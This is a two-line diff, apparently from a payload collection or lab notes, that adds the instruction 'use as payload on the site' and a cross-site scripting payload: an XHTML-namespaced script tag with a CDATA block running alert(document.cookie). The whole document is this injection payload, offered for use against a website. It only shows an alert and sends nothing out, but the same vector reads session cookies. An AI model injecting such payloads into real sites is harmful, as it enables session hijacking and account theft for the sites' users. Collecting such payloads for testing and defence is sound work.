@@ -1,0 +1,2 @@
+use as payload on the site:
+<script xmlns="http://www.w3.org/1999/xhtml"><![CDATA[ alert(document.cookie); ]]></script>
